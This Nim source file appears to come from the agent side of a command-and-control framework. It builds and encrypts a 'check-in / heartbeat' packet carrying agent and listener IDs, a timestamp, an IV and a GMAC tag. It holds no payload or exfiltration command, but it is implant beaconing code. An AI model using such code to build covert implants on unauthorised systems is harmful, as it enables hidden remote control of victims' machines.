import times 

import ../../common/[types, serialize, sequence, utils, crypto]

proc createHeartbeat*(ctx: AgentCtx): Heartbeat = 
    return Heartbeat(
        header: Header(
            magic: MAGIC,
            version: VERSION, 
            packetType: cast[uint8](MSG_HEARTBEAT),
            flags: cast[uint16](FLAG_ENCRYPTED),
            size: 0'u32,
            agentId: string.toUuid(ctx.agentId),
            seqNr: 0'u32,  
            iv: generateBytes(Iv),
            gmac: default(AuthenticationTag)
        ), 
        listenerId: string.toUuid(ctx.listenerId),
        timestamp: uint32(now().toTime().toUnix())
    )

proc serializeHeartbeat*(ctx: AgentCtx, request: var Heartbeat): seq[byte] =

    var packer = Packer.init()

    # Serialize check-in / heartbeat request
    packer 
        .add(request.listenerId)
        .add(request.timestamp)

    let body = packer.pack()
    packer.reset()

    # Encrypt check-in / heartbeat request body 
    let (encData, gmac) = encrypt(ctx.sessionKey, request.header.iv, body, request.header.seqNr)

    # Set authentication tag (GMAC)
    request.header.gmac = gmac

    # Serialize header
    let header = packer.serializeHeader(request.header, uint32(encData.len))

    return header & encData